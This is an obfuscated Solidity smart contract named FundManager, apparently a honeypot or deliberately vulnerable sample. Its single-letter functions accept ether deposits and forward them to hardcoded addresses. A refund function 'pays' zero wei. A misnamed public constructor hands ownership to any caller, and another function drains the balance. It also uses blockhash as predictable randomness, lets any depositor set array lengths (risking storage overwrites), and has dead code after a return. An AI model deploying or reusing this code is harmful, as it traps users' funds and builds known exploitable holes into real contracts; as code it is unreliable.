pragma solidity ^0.4.23;

contract FundManager {


address public z = 0x0;
address public ad;
address public j = 0x461ec7309F187dd4650EE6b4D25D93c922d7D56b;
address public g = 0x1C3E062c77f09fC61550703bDd1D59842C22c766;
address[] public x;

mapping(address=>bool) d;

uint256 public aa;
uint256[] public ah = [951828771,158769871220];
uint256[] public balance;


function DranMe() public payable{
	ad = msg.sender;
}


modifier o() {
    require(msg.sender == ad);
    _;
}

modifier m() {
    require(msg.sender == z);
    _;
}

modifier k() {
    require(d[msg.sender]);
    _;
}


function n() public constant returns(uint256) {
	return ah.length;
}

function r(uint256 v) public payable o{
	aa = v;
}

function e() public constant returns(uint256) {
	return x.length;
}

function t() public constant returns(uint256) {
	return address(this).balance;
}

function f() public payable{
	require(msg.value >= 0.02 ether);
	x.push(msg.sender);
	d[msg.sender]=true;
}

function b() public payable k{
	require (msg.value >= 0.01 ether);
	if(msg.sender!=ad || h()){
	    uint256 y = 0;
        msg.sender.transfer(y);
	}
}

function h() private returns(bool){
    bytes32 af = q(blockhash(block.number-1));
    uint256 aa = uint256(af);
        if(aa%5==0){
            z = msg.sender;
            return true;
        }
        else{
            return false;
        }
    }

function c () public payable k {
	require (msg.value >= 0.005 ether);
	j.call.value(msg.value)();
}

function a () public payable k {
	require (msg.value >= 0.005 ether);
	g.call.value(msg.value)();
}

function u (uint256 ac, uint256 ab) public payable k {
	ah[ac] = ab;
}

function w (uint256 ag) public payable k {
	ah.length = ag;
}

function p (uint256 ae) public payable k returns(uint256) {
	return (ae / (ah[0]*ah[1]));
	if((ae / (ah[0]*ah[1])) == aa) {
		ad = z;
	}
}

function i () public payable k returns(bool) {
    require(msg.value >= 0.01 ether);
    if(msg.value == aa){
        return true;
    }
}

function s() public payable o {
	ad.call.value(1 wei)();
}

function l() public payable m {
	z.transfer(address(this).balance);
}


function() public payable{
	}
}